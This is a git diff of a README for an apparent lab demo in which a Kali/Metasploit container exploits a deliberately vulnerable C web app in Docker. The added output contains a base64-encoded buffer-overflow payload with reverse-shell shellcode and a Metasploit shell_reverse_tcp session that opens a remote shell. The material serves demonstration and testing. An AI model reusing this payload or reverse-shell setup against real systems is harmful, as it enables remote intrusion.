@@ -22,11 +22,10 @@ In this example, an attacker container (`polyverse-internal.jfrog.io/kali-metasp
 
 1. In this repo, perform `pv build -r polyverse-internal.jfrog.io docker`. This will create the Docker container image `polyverse-internal.jfrog.io/kali-metasploit`.
 2. `cd ..` to move up a folder and then `git clone https://github.com/polyverse-security/c-exploit.git`. If you've already cloned, just go to the folder and `git pull`.
-3. Modify evil.c line `#define IPADDR "\xac\x11\x00\x03"` with the hex value representation of the results from `docker run -it polyverse-internal.jfrog.io/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}'` This is the IP address of the kali-metasploit container -- the target for the reverse shell.
-4. `pv build docker` to create a new version of `polyverse/c-exploit`.
-5. `cd ../kali-metasploit` to get back to the original folder.
-6. In one terminal window, launch `docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit`
-7. In another terminial window, run the `./c-exploit.sh` script. You can look at the script to see what it's doing, but it's basically calling the `kali-metasploit` container with sub-scripts to determine ip addresses; it also runs `msfconsole` with the `-x` option that allows you to specify all the arguments for the metasploit module in a single command line.
+3. `pv build docker` to create a new version of `polyverse/c-exploit`.
+4. `cd ../kali-metasploit` to get back to the original folder.
+5. In one terminal window, launch `docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit`
+6. In another terminial window, run the `./c-exploit.sh` script. You can look at the script to see what it's doing, but it's basically calling the `kali-metasploit` container with sub-scripts to determine ip addresses; it also runs `msfconsole` with the `-x` option that allows you to specify all the arguments for the metasploit module in a single command line.
 
 This is what you should see in the c-exploit window:
 
@@ -36,7 +35,7 @@ AH00558: apache2: Could not reliably determine the server's fully qualified doma
 AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
 [Tue Aug 15 07:16:40.745028 2017] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.10 (Debian) PHP/7.1.8 configured -- resuming normal operations
 [Tue Aug 15 07:16:40.745097 2017] [core:notice] [pid 1] AH00094: Command line: 'apache2 -D FOREGROUND'
-172.17.0.1 - - [15/Aug/2017:07:17:01 +0000] "GET /evil.php HTTP/1.1" 200 581 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+172.17.0.1 - - [15/Aug/2017:07:17:01 +0000] "GET /index.php?q=YWFhYWFhYWFhYWFhYWFhYWEw5v///38AAGopWJlqAl9qAV4PBUiXSLkCABWzrBEAAlFIieZqEFpqKlgPBWoDXkj/zmohWA8FdfZqO1iZSLsvYmluL3NoAFNIiedSV0iJ5g8FYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYg== HTTP/1.1" 200 277 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
 ```
 
 And this is what you should see in the kali-metasploit window:
@@ -64,13 +63,14 @@ $ ./c-exploit.sh
 
 RHOST => 192.168.0.15
 RPORT => 8080
-payload => linux/x86/shell_reverse_tcp
-LHOST => 172.17.0.3
+payload => linux/x64/shell_reverse_tcp
+LHOST => 172.17.0.2
 LPORT => 5555
-[*] Started reverse TCP handler on 172.17.0.3:5555 
+[*] Started reverse TCP handler on 172.17.0.2:5555 
 [*] start exploit...
-[*] YWFhYWFhYWFhYWFhYWFhYWEw5v%2F%2F%2F38AAEgxwEgx%2F0gx9kgx0k0xwGoCX2oBXmoGWmopWA8FSYnASDH2TTHSQVLGBCQCZsdEJAIVs8dEJASsEAEfSInmahBaQVBfaipYDwVIMfZqA15I%2F85qIVgPBXX2SDH%2FV1deWki%2FLy9iaW4vc2hIwe8IV1RfajtYDwViYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiAA%3D%3D"
-[*] Command shell session 1 opened (172.17.0.3:5555 -> 172.17.0.2:56998) at 2017-08-15 07:17:02 +0000
+[*] address of rsp w/ offset = 7fffffffe630
+[*] base64-encoded payload: YWFhYWFhYWFhYWFhYWFhYWEw5v///38AAGopWJlqAl9qAV4PBUiXSLkCABWzrBEAAlFIieZqEFpqKlgPBWoDXkj/zmohWA8FdfZqO1iZSLsvYmluL3NoAFNIiedSV0iJ5g8FYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYg== (Length: 500)
+[*] Command shell session 7 opened (172.17.0.2:5555 -> 172.17.0.3:42242) at 2017-08-16 07:01:56 +0000
 [*] done exploit.... 
 ```
 
